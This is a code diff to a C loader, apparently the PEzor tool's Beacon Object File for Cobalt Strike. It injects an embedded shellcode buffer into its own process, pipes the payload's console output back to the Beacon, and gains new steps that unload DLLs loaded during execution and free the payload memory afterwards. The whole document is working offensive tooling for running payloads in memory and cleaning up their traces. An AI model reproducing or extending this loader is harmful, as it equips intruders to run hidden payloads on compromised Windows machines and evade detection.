@@ -10,6 +10,7 @@
 
 #define BUFFER_SIZE 1024
 #define _WAIT_TIMEOUT 5000
+#define ARRAY_MODULES_SIZE 128
 #define NT_FAIL(status) (status < 0)
 
 #pragma clang diagnostic ignored "-Wnested-anon-types"
@@ -70,6 +71,9 @@ extern "C" DECLSPEC_IMPORT WINBASEAPI LPVOID   WINAPI  KERNEL32$VirtualAlloc(LPV
 extern "C" DECLSPEC_IMPORT WINBASEAPI BOOL     WINAPI  KERNEL32$VirtualFree(LPVOID, SIZE_T, DWORD);
 #define VirtualFree KERNEL32$VirtualFree
 
+extern "C" DECLSPEC_IMPORT WINBASEAPI BOOL     WINAPI  KERNEL32$VirtualFreeEx(HANDLE, LPVOID, SIZE_T, DWORD);
+#define VirtualFreeEx KERNEL32$VirtualFreeEx
+
 extern "C" DECLSPEC_IMPORT WINBASEAPI BOOL     WINAPI  KERNEL32$VirtualProtect(LPVOID, SIZE_T, DWORD, PDWORD);
 #define VirtualProtect KERNEL32$VirtualProtect
 
@@ -105,6 +109,14 @@ extern "C" DECLSPEC_IMPORT WINBASEAPI BOOL     WINAPI  KERNEL32$PeekNamedPipe(
   LPDWORD lpBytesLeftThisMessage
 );
 #define PeekNamedPipe KERNEL32$PeekNamedPipe
+
+extern "C" DECLSPEC_IMPORT WINBASEAPI BOOL WINAPI PSAPI$EnumProcessModules(
+  HANDLE  hProcess,
+  HMODULE *lphModule,
+  DWORD   cb,
+  LPDWORD lpcbNeeded
+);
+#define EnumProcessModules PSAPI$EnumProcessModules
 
 extern "C" DECLSPEC_IMPORT int      __cdecl  MSVCRT$_open_osfhandle(
    intptr_t osfhandle,
@@ -165,52 +177,91 @@ FILE *__cdecl __acrt_iob_funcs(int index)
 
 #endif
 
-BOOL create_pipe(HANDLE* pipeRead, HANDLE* pipeWrite) {
+BOOL createPipe(HANDLE* pipeRead, HANDLE* pipeWrite) {
     SECURITY_ATTRIBUTES sa = {sizeof(sa), NULL, TRUE};
     return CreatePipe(pipeRead, pipeWrite, &sa, 0);
 }
 
-void redirect_io(FILE* hFrom, HANDLE hTo) {
+void redirectIO(FILE* hFrom, HANDLE hTo) {
     int fd = _open_osfhandle((intptr_t)hTo, _O_TEXT);
     _dup2(fd, _fileno(hFrom));
     setvbuf(hFrom, NULL, _IONBF, 0); //Disable buffering.
 }
 
-void redirect_io2(DWORD handle, HANDLE hTo) {
-    SetStdHandle(handle, hTo);
-}
-
-void restore_io(int stdoutFd, int stderrFd, HANDLE stdoutHandle, HANDLE stderrHandle) {
+void restoreIO(int stdoutFd, int stderrFd, HANDLE stdoutHandle, HANDLE stderrHandle) {
     _dup2(stdoutFd, _fileno(stdout));
     _dup2(stderrFd, _fileno(stderr));
     SetStdHandle(STD_OUTPUT_HANDLE, stdoutHandle);
     SetStdHandle(STD_ERROR_HANDLE, stderrHandle);
 }
 
-BOOL CreateConsole() {
+BOOL createConsole() {
     if (!AllocConsole()) {
-        // Add some error handling here.
-        // You can call GetLastError() to get more info about the error.
         return FALSE;
     }
 
-    // std::cout, std::clog, std::cerr, std::cin
     FILE* fDummy;
     freopen_s(&fDummy, "CONOUT$", "w", stdout);
     freopen_s(&fDummy, "CONOUT$", "w", stderr);
-    //freopen_s(&fDummy, "CONIN$", "r", stdin);
 
-    // std::wcout, std::wclog, std::wcerr, std::wcin
     HANDLE hConOut = CreateFileA(TEXT("CONOUT$"), GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
-    //HANDLE hConIn = CreateFile(_T("CONIN$"), GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
     SetStdHandle(STD_OUTPUT_HANDLE, hConOut);
     SetStdHandle(STD_ERROR_HANDLE, hConOut);
-    //SetStdHandle(STD_INPUT_HANDLE, hConIn);
     return TRUE;
 }
 
+#ifdef _CLEANUP_
+BOOL isPresentInArray(HMODULE loadedModules[], HMODULE targetModule) {
+    for (unsigned int i = 0; i < ARRAY_MODULES_SIZE; i++) {
+        if (loadedModules[i] == targetModule) {
+            return TRUE;
+        }
+    }
+
+    return FALSE;
+}
+
+BOOL cleanupModules(HMODULE loadedModules[]) {
+    HMODULE hMods[ARRAY_MODULES_SIZE * sizeof(HMODULE)];
+    DWORD cbNeeded = -1;
+    BOOL wasLibraryFreed = FALSE;
+
+    __stosb((unsigned char*)hMods, 0, ARRAY_MODULES_SIZE * sizeof(HMODULE));
+
+    if (EnumProcessModules((HANDLE)-1, hMods, ARRAY_MODULES_SIZE * sizeof(HMODULE), &cbNeeded)) {
+        for (unsigned int i = 0; i < (cbNeeded / sizeof(HMODULE)); i++) {
+            if (!isPresentInArray(loadedModules, hMods[i])) {
+                FreeLibrary(hMods[i]);
+                wasLibraryFreed = TRUE;
+            }
+        }
+    }
+
+    return wasLibraryFreed;
+}
+
+BOOL cleanupModules2(unsigned int numberOfLoadedModules) {
+    HMODULE hMods[ARRAY_MODULES_SIZE * sizeof(HMODULE)];
+    DWORD cbNeeded = -1;
+    BOOL wasLibraryFreed = FALSE;
+
+    numberOfLoadedModules -= 9; // numbers of modules loaded by the bof itself
+
+    __stosb((unsigned char*)hMods, 0, ARRAY_MODULES_SIZE * sizeof(HMODULE));
+
+    if (EnumProcessModules((HANDLE)-1, hMods, ARRAY_MODULES_SIZE * sizeof(HMODULE), &cbNeeded)) {
+        for (unsigned int i = numberOfLoadedModules; i < (cbNeeded / sizeof(HMODULE)); i++) {
+            FreeLibrary(hMods[i]);
+            wasLibraryFreed = TRUE;
+        }
+    }
+
+    return wasLibraryFreed;
+}
+#endif
+
 #ifndef _BOF_
-DWORD WINAPI hello_world(LPVOID lpParam) {
+DWORD WINAPI helloWorld(LPVOID lpParam) {
     puts("Hello World!\n");
     perror("Welp\n");
     for (int i = 0; i < 1024; i++) {
@@ -239,91 +290,85 @@ int go(char * args, int alen) {
     DWORD bytesRead = 0;
     DWORD remainingDataOutput = 0;
     DWORD remainingDataError = 0;
+    DWORD cbNeeded = -1;
+    HMODULE loadedModules[ARRAY_MODULES_SIZE * sizeof(HMODULE)];
 
     #ifdef SYSCALLS
     my_init_syscalls_list();
     #endif
 
     #ifdef _BOF_
-    BeaconPrintf(CALLBACK_OUTPUT, "Starting BOF...");
+    BeaconPrintf(CALLBACK_OUTPUT, "[PEzor] starting BOF...");
     #endif
+
+    __stosb((unsigned char*)loadedModules, 0, ARRAY_MODULES_SIZE * sizeof(HMODULE));
+    EnumProcessModules((HANDLE)-1, loadedModules, ARRAY_MODULES_SIZE * sizeof(HMODULE), &cbNeeded);
 
     stdoutHandle = GetStdHandle(STD_OUTPUT_HANDLE);
     stderrHandle = GetStdHandle(STD_ERROR_HANDLE);
     stdoutFd = _dup(_fileno(stdout));
     stderrFd = _dup(_fileno(stderr));
-    wasConsoleCreated = CreateConsole();
-    //puts("Before redir\n");
-    create_pipe(&pipeReadOutput, &pipeWriteOutput);
-    create_pipe(&pipeReadError, &pipeWriteError);
-    redirect_io(stdout, pipeWriteOutput);
-    //redirect_io2(STD_OUTPUT_HANDLE, pipeWriteOutput);
-    redirect_io(stderr, pipeWriteError);
-    //redirect_io2(STD_ERROR_HANDLE, pipeWriteError);
+    wasConsoleCreated = createConsole();
+    createPipe(&pipeReadOutput, &pipeWriteOutput);
+    createPipe(&pipeReadError, &pipeWriteError);
+    redirectIO(stdout, pipeWriteOutput);
+    redirectIO(stderr, pipeWriteError);
 
     #ifndef _BOF_
     DWORD dwThreadId = -1;
     HANDLE hThread = CreateThread(
-        NULL,           // default security attributes
-        0,              // use default stack size
-        hello_world,    // thread function name
-        NULL,           // argument to thread function
-        0,              // use default creation flags
-        &dwThreadId);   // returns the thread identifier
+        NULL,
+        0,
+        helloWorld,
+        NULL,
+        0,
+        &dwThreadId);
     #else
     HANDLE hThread = INVALID_HANDLE_VALUE;
-    NTSTATUS status = inject_shellcode_self(buf, buf_size, &hThread, FALSE, 0);
-    if (NT_FAIL(status) || hThread == (HANDLE)-1) {
-        restore_io(stdoutFd, stderrFd, stdoutHandle, stderrHandle);
+    LPVOID allocation = inject_shellcode_self(buf, buf_size, &hThread, FALSE, 0);
+    if (!allocation || hThread == (HANDLE)-1) {
+        restoreIO(stdoutFd, stderrFd, stdoutHandle, stderrHandle);
         #ifdef _BOF_
-        BeaconPrintf(CALLBACK_ERROR, "inject_shellcode_self: ERROR 0x%x", status);
-        printf("inject_shellcode_self: ERROR 0x%x", status);
+        BeaconPrintf(CALLBACK_ERROR, "inject_shellcode_self: ERROR 0x%x", allocation);
+        printf("inject_shellcode_self: ERROR 0x%x", allocation);
         #else
-        printf("inject_shellcode_self: ERROR 0x%x", status);
+        printf("inject_shellcode_self: ERROR 0x%x", allocation);
         #endif
-        return status;
+        return -1;
     }
     #endif
 
-    //fprintf(stderr, "before do, buf_size = %d\n", buf_size);
-
     do {
         waitResult = WaitForSingleObject(hThread, _WAIT_TIMEOUT);
-        //perror("after wait for single object\n");
         switch (waitResult) {
         case WAIT_ABANDONED:
-            restore_io(stdoutFd, stderrFd, stdoutHandle, stderrHandle);
+            restoreIO(stdoutFd, stderrFd, stdoutHandle, stderrHandle);
             perror("WAIT_ABANDONED\n");
-            //return -1;
             break;
         case WAIT_FAILED:
-            restore_io(stdoutFd, stderrFd, stdoutHandle, stderrHandle);
+            restoreIO(stdoutFd, stderrFd, stdoutHandle, stderrHandle);
             perror("WAIT_FAILED\n");
             break;
-            //return -1;
         case _WAIT_TIMEOUT:
             break;
         case WAIT_OBJECT_0:
             isThreadFinished = TRUE;
         }
 
-        //perror("before peeknamedpipe 1\n");
         PeekNamedPipe(pipeReadOutput, NULL, 0, NULL, &remainingDataOutput, NULL);
-        //fprintf(stderr, "[DEBUG] remainingDataOutput = %d\n", remainingDataOutput);
         if (remainingDataOutput) {
             SetLastError(0);
-            __stosb(recvBuffer, 0, BUFFER_SIZE);
+            __stosb((unsigned char*)(void*)recvBuffer, 0, BUFFER_SIZE);
             bytesRead = 0;
             readResult = ReadFile(
-                pipeReadOutput,        // pipe handle
-                recvBuffer,      // buffer to receive reply
-                BUFFER_SIZE - 1, // size of buffer
-                &bytesRead,      // number of bytes read
-                NULL);           // not overlapped
+                pipeReadOutput,
+                recvBuffer,
+                BUFFER_SIZE - 1,
+                &bytesRead,
+                NULL);
 
             if (!readResult) {
-                restore_io(stdoutFd, stderrFd, stdoutHandle, stderrHandle);
-                //printf("ERROR ReadFile: %d, GLE=%lu\n", readResult, GetLastError());
+                restoreIO(stdoutFd, stderrFd, stdoutHandle, stderrHandle);
                 return -1;
             }
 
@@ -331,27 +376,22 @@ int go(char * args, int alen) {
             #ifdef _BOF_
             BeaconPrintf(CALLBACK_OUTPUT, "%s", recvBuffer);
             #endif
-            //perror("[DEBUG] Received by pipe:\n");
-            //perror(recvBuffer);
         }
 
-        //perror("before peeknamedpipe 2\n");
         PeekNamedPipe(pipeReadError, NULL, 0, NULL, &remainingDataError, NULL);
-        //fprintf(stderr, "[DEBUG] remainingDataOutput = %d\n", remainingDataOutput);
         if (remainingDataError) {
             SetLastError(0);
             __stosb(recvBuffer, 0, BUFFER_SIZE);
             bytesRead = 0;
             readResult = ReadFile(
-                pipeReadError,        // pipe handle
-                recvBuffer,      // buffer to receive reply
-                BUFFER_SIZE - 1, // size of buffer
-                &bytesRead,      // number of bytes read
-                NULL);           // not overlapped
+                pipeReadError,
+                recvBuffer,
+                BUFFER_SIZE - 1,
+                &bytesRead,
+                NULL);
 
             if (!readResult) {
-                restore_io(stdoutFd, stderrFd, stdoutHandle, stderrHandle);
-                //printf("ERROR ReadFile: %d, GLE=%lu\n", readResult, GetLastError());
+                restoreIO(stdoutFd, stderrFd, stdoutHandle, stderrHandle);
                 return -1;
             }
 
@@ -359,14 +399,10 @@ int go(char * args, int alen) {
             #ifdef _BOF_
             BeaconPrintf(CALLBACK_ERROR, "%s", recvBuffer);
             #endif
-            //perror("[DEBUG] Received by pipe:\n");
-            //perror(recvBuffer);
         }
     } while (!isThreadFinished || remainingDataOutput || remainingDataError);
-    restore_io(stdoutFd, stderrFd, stdoutHandle, stderrHandle);
-    //perror("after restore io\n");
-    //perror("[DEBUG] Received last by pipe:\n");
-    //perror((const char *)recvBuffer);
+
+    restoreIO(stdoutFd, stderrFd, stdoutHandle, stderrHandle);
     if (wasConsoleCreated) {
         CloseHandle(GetStdHandle(STD_OUTPUT_HANDLE));
         CloseHandle(GetStdHandle(STD_ERROR_HANDLE));
@@ -378,6 +414,29 @@ int go(char * args, int alen) {
     CloseHandle(pipeWriteError);
     CloseHandle(pipeReadError);
 
-    //perror("before return\n");
+    #ifdef _CLEANUP_
+    //if (cleanupModules(loadedModules)) {
+    if (cleanupModules2(cbNeeded / sizeof(HMODULE))) {
+        // some module was freed
+        #ifdef _BOF_
+        BeaconPrintf(CALLBACK_OUTPUT, "[PEzor] cleanup complete");
+        #endif
+    } else {
+        #ifdef _BOF_
+        BeaconPrintf(CALLBACK_OUTPUT, "[PEzor] no cleanup needed");
+        #endif
+    }
+
+    if (VirtualFreeEx((HANDLE)-1, allocation, 0, MEM_RELEASE)) {
+        #ifdef _BOF_
+        BeaconPrintf(CALLBACK_OUTPUT, "[PEzor] payload freed");
+        #endif
+    } else {
+        #ifdef _BOF_
+        BeaconPrintf(CALLBACK_ERROR, "[PEzor] error when freeing payload");
+        #endif
+    }
+    #endif
+
     return 0;
 }
